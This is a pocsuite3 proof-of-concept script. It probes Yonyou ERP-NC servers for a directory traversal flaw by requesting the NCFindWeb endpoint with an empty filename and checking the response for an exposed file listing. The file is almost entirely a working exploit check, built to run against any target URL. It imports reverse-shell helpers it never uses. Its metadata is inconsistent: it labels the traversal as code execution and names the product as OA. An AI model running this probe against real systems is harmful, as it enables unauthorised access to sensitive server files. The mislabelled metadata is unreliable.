from pocsuite3.api import Output, POCBase, register_poc, requests, logger, VUL_TYPE, POC_CATEGORY, OptDict
from pocsuite3.api import get_listener_ip, get_listener_port
from pocsuite3.api import REVERSE_PAYLOAD
from pocsuite3.lib.utils import random_str
from collections import OrderedDict
class DemoPOC(POCBase):
    vulID = '000'  # ssvid
    version = '1.0'
    name = '用友ERP-NC存在目录遍历漏洞'
    appName = '用友OA'
    appVersion = '7.0~7.31'
    vulType = VUL_TYPE.CODE_EXECUTION
    desc = '''用友ERP-NC存在目录遍历漏洞，攻击者可以通过目录遍历获取敏感文件信息'''
    samples = []
    install_requires = ['']
    category = POC_CATEGORY.EXPLOITS.WEBAPP

    def _verify(self):#验证模式
        result = {}
        try:
            target = self.url+"/NCFindWeb?service=IPreAlertConfigService&filename="
            r = requests.get(url=target,timeout=8,verify=False)
            if r.status_code == 200 and "menu.jsp" in r.text:
                result['verifyInfo'] = {}
                result['verifyInfo']['URL'] = target
                return self.parse_output(result)
        except:
            return
    def parse_output(self,result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output
register_poc(DemoPOC)